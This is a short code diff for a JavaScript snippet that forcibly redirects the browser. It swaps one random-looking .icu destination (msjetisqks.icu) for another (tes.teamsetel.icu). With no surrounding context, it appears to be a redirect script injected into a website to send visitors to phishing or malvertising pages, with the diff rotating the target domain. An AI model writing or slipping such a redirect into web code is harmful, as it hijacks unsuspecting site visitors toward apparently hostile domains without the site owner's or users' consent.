@@ -1,3 +1,3 @@
 (function() {
-    window['location'] = 'https://msjetisqks.icu/';
+    window['location'] = 'https://tes.teamsetel.icu/';
 })();
